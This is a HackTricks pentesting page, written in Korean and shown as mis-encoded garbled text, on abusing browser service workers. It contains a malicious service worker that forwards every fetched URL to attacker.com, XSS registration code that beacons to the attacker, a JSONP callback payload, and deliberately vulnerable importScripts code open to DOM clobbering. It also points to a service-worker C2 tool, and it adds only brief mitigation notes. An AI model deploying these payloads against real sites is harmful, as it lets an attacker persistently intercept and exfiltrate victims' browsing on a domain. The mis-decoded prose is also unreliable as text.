# Service Workers ë‚¨ìš©í•˜ê¸°



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **HackTricksì—ì„œ ê·€ì‚¬ë¥¼ ê´‘ê³ **í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? í˜¹ì€ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFT ì»¬ë ‰ì…˜**](https://opensea.io/collection/the-peass-family)
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ ë°›ìœ¼ì„¸ìš”
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  PRì„ ì œì¶œí•˜ì—¬** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì°¸ì—¬**í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**ì„œë¹„ìŠ¤ ì›Œì»¤**ëŠ” ì›¹ í˜ì´ì§€ë‚˜ ì‚¬ìš©ì ìƒí˜¸ ì‘ìš©ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê¸°ëŠ¥ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” ë¸Œë¼ìš°ì €ì—ì„œ ë°±ê·¸ë¼ìš´ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¡œ, **ì˜¤í”„ë¼ì¸ ë° ë°±ê·¸ë¼ìš´ë“œ ì²˜ë¦¬** ê¸°ëŠ¥ì„ í–¥ìƒì‹œí‚µë‹ˆë‹¤. ì„œë¹„ìŠ¤ ì›Œì»¤ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [ì—¬ê¸°](https://developers.google.com/web/fundamentals/primers/service-workers)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ ë„ë©”ì¸ ë‚´ì—ì„œ ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ì•…ìš©í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” í”¼í•´ìì˜ í•´ë‹¹ ë„ë©”ì¸ ë‚´ ëª¨ë“  í˜ì´ì§€ì™€ì˜ ìƒí˜¸ ì‘ìš©ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### ê¸°ì¡´ ì„œë¹„ìŠ¤ ì›Œì»¤ í™•ì¸

ê¸°ì¡´ ì„œë¹„ìŠ¤ ì›Œì»¤ëŠ” **ê°œë°œì ë„êµ¬**ì˜ **Application** íƒ­ì˜ **Service Workers** ì„¹ì…˜ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë” ìì„¸í•œ ë³´ê¸°ë¥¼ ìœ„í•´ [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)ì„ ë°©ë¬¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### í‘¸ì‹œ ì•Œë¦¼

**í‘¸ì‹œ ì•Œë¦¼ ê¶Œí•œ**ì€ **ì„œë¹„ìŠ¤ ì›Œì»¤**ê°€ ì§ì ‘ì ì¸ ì‚¬ìš©ì ìƒí˜¸ ì‘ìš© ì—†ì´ ì„œë²„ì™€ í†µì‹ í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì— ì§ì ‘ì ì¸ ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤. ê¶Œí•œì´ ê±°ë¶€ë˜ë©´, ì§€ì†ì ì¸ ìœ„í˜‘ì„ ì œê³µí•  ìˆ˜ ìˆëŠ” ì„œë¹„ìŠ¤ ì›Œì»¤ì˜ ì ì¬ë ¥ì´ ì œí•œë©ë‹ˆë‹¤. ë°˜ë©´ì— ê¶Œí•œì„ ë¶€ì—¬í•˜ë©´, ì ì¬ì ì¸ ì•…ìš©ì˜ ìˆ˜ì‹  ë° ì‹¤í–‰ì„ ê°€ëŠ¥í•˜ê²Œ í•¨ìœ¼ë¡œì¨ ë³´ì•ˆ ìœ„í—˜ì„ ì¦ê°€ì‹œí‚µë‹ˆë‹¤.

## ì„œë¹„ìŠ¤ ì›Œì»¤ ìƒì„± ê³µê²©

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤:

* ì„œë²„ì— **ì„ì˜ì˜ JS íŒŒì¼ì„ ì—…ë¡œë“œ**í•˜ê³  í•´ë‹¹ ì—…ë¡œë“œëœ JS íŒŒì¼ì˜ **ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ë¡œë“œí•  XSS** ë°©ë²•
* **ì¡°ì‘ ê°€ëŠ¥í•œ ì¶œë ¥ (ì„ì˜ì˜ JS ì½”ë“œë¡œ)**ì„ ê°€ì§„ **ì·¨ì•½í•œ JSONP ìš”ì²­** ë° **JSONPë¥¼ ë¡œë“œí•  XSS**ì™€ í•¨ê»˜ **ì•…ì˜ì ì¸ ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ë¡œë“œ**í•  **XSS**ê°€ ìˆëŠ” **ì·¨ì•½í•œ JSONP ìš”ì²­**.

ë‹¤ìŒ ì˜ˆì œì—ì„œëŠ” `fetch` ì´ë²¤íŠ¸ë¥¼ ìˆ˜ì‹ í•˜ê³  **ê° ê°€ì ¸ì˜¨ URLì„ ê³µê²©ì ì„œë²„ë¡œ ë³´ë‚´ëŠ” ìƒˆë¡œìš´ ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ë“±ë¡**í•˜ëŠ” ì½”ë“œë¥¼ ì œì‹œí•˜ê² ìŠµë‹ˆë‹¤:
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
ê·¸ë¦¬ê³  ì´ê²ƒì€ **ì›Œì»¤ë¥¼ ë“±ë¡**í•  ì½”ë“œì…ë‹ˆë‹¤ (**XSS**ë¥¼ ì•…ìš©í•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì½”ë“œ). ì´ ê²½ìš° **ê³µê²©ì** ì„œë²„ë¡œ **GET** ìš”ì²­ì´ ì „ì†¡ë˜ì–´ ì„œë¹„ìŠ¤ ì›Œì»¤ì˜ **ë“±ë¡**ì´ ì„±ê³µí–ˆëŠ”ì§€ ì—¬ë¶€ë¥¼ **ì•Œë¦½ë‹ˆë‹¤**:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
JSONP ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì•…ìš©í•˜ëŠ” ê²½ìš° `var sw` ë‚´ë¶€ì— ê°’ì„ ë„£ì–´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
**ì„œë¹„ìŠ¤ ì›Œì»¤ (SW) ì•…ìš©ì„ ìœ„í•œ C2**ì¸ [**Shadow Workers**](https://shadow-workers.github.io)ëŠ” ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë° ë§¤ìš° ìœ ìš©í•  ê²ƒì…ë‹ˆë‹¤.

**24ì‹œê°„ ìºì‹œ ì§€ì‹œë¬¸**ì€ ì•…ì˜ì ì´ê±°ë‚˜ ì¹¨í•´ë‹¹í•œ **ì„œë¹„ìŠ¤ ì›Œì»¤ (SW)**ì˜ ìˆ˜ëª…ì„ ìµœëŒ€ 24ì‹œê°„ìœ¼ë¡œ ì œí•œí•˜ë©°, XSS ì·¨ì•½ì  ìˆ˜ì • í›„ ì˜¨ë¼ì¸ í´ë¼ì´ì–¸íŠ¸ ìƒíƒœë¥¼ ê°€ì •í•©ë‹ˆë‹¤. ì·¨ì•½ì„±ì„ ìµœì†Œí™”í•˜ê¸° ìœ„í•´ ì‚¬ì´íŠ¸ ìš´ì˜ìëŠ” SW ìŠ¤í¬ë¦½íŠ¸ì˜ Time-To-Live (TTL)ì„ ë‚®ì¶œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê°œë°œìë“¤ì€ ë˜í•œ ë¹ ë¥¸ ë¹„í™œì„±í™”ë¥¼ ìœ„í•´ [**ì„œë¹„ìŠ¤ ì›Œì»¤ í‚¬ ìŠ¤ìœ„ì¹˜**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)ë¥¼ ë§Œë“¤ ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

## DOM Clobberingì„ í†µí•œ SWì—ì„œ `importScripts` ì•…ìš©

ì„œë¹„ìŠ¤ ì›Œì»¤ì—ì„œ í˜¸ì¶œëœ **`importScripts`** í•¨ìˆ˜ëŠ” **ë‹¤ë¥¸ ë„ë©”ì¸ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ í•¨ìˆ˜ê°€ **ê³µê²©ìê°€ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜¸ì¶œë˜ë©´**, ê·¸ëŠ” **ìì‹ ì˜ ë„ë©”ì¸ì—ì„œ JS ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê°€ì ¸ì™€ XSSë¥¼ ì–»ì„ ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤**.

**ì´ëŠ” CSP ë³´í˜¸ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤.**

**ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobberingì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš°

DOM Clobberingì´ ë¬´ì—‡ì¸ì§€ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

ë§Œì•½ SWê°€ **`importScripts`**ë¥¼ í˜¸ì¶œí•˜ëŠ” URL/ë„ë©”ì¸ì´ **HTML ìš”ì†Œ ë‚´ë¶€ì— ìˆëŠ” ê²½ìš°**, DOM Clobberingì„ í†µí•´ í•´ë‹¹ URLì„ ìˆ˜ì •í•˜ì—¬ SWê°€ **ìì‹ ì˜ ë„ë©”ì¸ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ë¡œë“œí•˜ë„ë¡** ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì— ëŒ€í•œ ì˜ˆì œëŠ” ì°¸ì¡° ë§í¬ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.

## ì°¸ê³  ìë£Œ

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”?** **HackTricksì—ì„œ ê·€í•˜ì˜ íšŒì‚¬ë¥¼ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ë˜ëŠ” **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì‹­ì‹œì˜¤. ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* **ğŸ’¬** [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”**.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— PRì„ ì œì¶œí•˜ì„¸ìš”**.

</details>
